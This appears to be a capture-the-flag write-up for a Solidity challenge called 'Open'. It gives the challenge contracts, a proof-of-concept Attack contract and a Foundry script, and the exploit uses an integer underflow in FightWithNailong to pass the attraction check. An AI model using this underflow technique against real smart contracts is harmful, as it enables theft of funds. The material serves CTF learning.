# Open

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.7.6;

import {Open} from "./Open.sol";

contract Setup {
    Open public open;
    bool public solved;
    address private deployer;

    constructor() payable {
        open = new Open(123456789, 987654321);
        deployer = msg.sender;
    }

    function getInstance() external view returns (address) {
        return address(open);
    }

    function isSolved() external returns (bool) {
        if (open.solved()) {
            solved = true;
        }
        return solved;
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.7.6;

import {Setup} from "./setup.sol";

contract Open {
    bool private attend;
    bool private stay;
    bool public solved;
    uint256 private key;
    uint256 private fakekey;
    mapping(address => uint256) public Attraction;

    constructor(uint256 _key, uint256 _fakekey) {
        key = _key;
        fakekey = _fakekey;
    }

    function open() external {
        require(Attraction[msg.sender] >= 99999, "Your Attraction is not enough to open!");
        solved = true;
    }

    function goodkey(uint256 _key) external {
        if (_key == key) {
            Attraction[msg.sender] += 9999;
        } else {
            Attraction[msg.sender] = 0; // be careful
        }
    }

    function PlayWithNailong() external {
        require(!attend, "just 1 chance!");
        attend = true;
        Attraction[msg.sender] += 1;
    }

    function StayWithNailong() public {
        require(!stay, "just 1 chance!!");
        stay = true;
        Attraction[msg.sender] += 1;
    }

    function FightWithNailong() public {
        require(stay && attend, "Why don't try?");
        Attraction[msg.sender] -= 1;
    }
}

```

# poc
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.7.6;

import {Open} from "./Open.sol";
import {Setup} from "./setup.sol";

contract Attack {
    Open open;
    Setup setup;

    constructor(address _addr) {
        open = Open(_addr);
    }

    function attack() external {
        open.PlayWithNailong();
        open.StayWithNailong();
        open.FightWithNailong();
        open.FightWithNailong();
        open.FightWithNailong();

        open.open();
    }
}
```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.7.6;

import {Open} from "../src/Open.sol";
import {Setup} from "../src/setup.sol";
import {Attack} from "../src/1.sol";
import {Script} from "../lib/forge-std/src/Script.sol";

contract Attacksc is Script {
    Attack attack;

    function run() external {
        vm.startBroadcast();
        Setup setup = Setup(0xSETUP_ADDRESS);
        attack = new Attack(setup.getInstance());
        attack.attack();
        vm.stopBroadcast();
    }
}

```



> 更新: 2025-12-17 21:09:32  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/dvol5z54ire0piqg>